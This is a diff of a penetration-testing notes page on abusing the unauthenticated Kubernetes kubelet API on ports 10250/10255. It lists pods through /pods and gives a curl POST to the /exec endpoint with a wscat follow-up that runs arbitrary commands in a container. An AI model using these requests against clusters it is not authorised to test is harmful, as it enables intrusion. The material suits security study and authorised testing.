@@ -1,29 +1,58 @@
-Kubernetes
-==========
+---
+title: "Kubernetes"
+description: "Check Kubernetes API and execute commands"
+date: 23/11/2020
+categories:
+ - Misc
+tags:
+ - docker
+ - kubernetes
+---
+
 
 ## API
-The Kubernetes API exposes the port `10250`. This API can be used to interact with the Kubernetes engine which basically give us the right to do anything you desire unauthenticated.
 
-To confirm that the host is running Docker you can make a GET requests to `/pods` :
+The Kubernetes API exposes the ports `10250` and `10255` (HTTP read-only).
+This API can be used to interact with the Kubernetes engine which basically
+give us the right to do anything you desire unauthenticated.
+
+
+### List pods
+
+To confirm that the host is running Docker you can make a GET requests to `/pods`:
 
 ```
 https://<host>:<port>/pods
+```
 
+```json
 {"kind":"PodList","apiVersion":"v1","metadata":{},"items":[{"metadata":{"name":"dind-sgz8n","generateName":"dind-","namespace":"default","selfLink":"/api/v1/namespaces/default/pods/dind-sgz8n",`...}],"qosClass":"BestEffort"}}]}
 ```
 
-With the above information it's possible to send requests to the API to execute commands:
+
+### Execute commands
+
+With the above information it's possible to send requests to the API to execute
+commands:
+
 ```bash
 $ curl --insecure -v -H "W-Stream-Protocol-Version: v2.channel.k8s.io" -H "X-Stream-Protocol-Version: channel.k8s.io" -H "Connection: upgrade" -H "Upgrade: SPDY/3.1" -X POST "https://<host>:<port>/exec/<namespace>/<pod_name>/<container_name>?command=<cmd>&input=1&output=1&tty=1"
 ```
 
 In the response, there is a `Location` header to create a WebSocket connection:
+
 ```bash
 $ wscat -c "https://<host>:<port>/<location_header>" --no-check
 ```
 
 
 ## Useful commands
+
+#### Kubernetes version
+
+```bash
+kubectl version
+```
 
 #### Start a pod
 
@@ -56,6 +85,7 @@ kubectl get services (-o wide)
 ```
 
 #### Print pods
+
 ```bash
 kubectl get pods -o json
 kubectl get pods -o wide
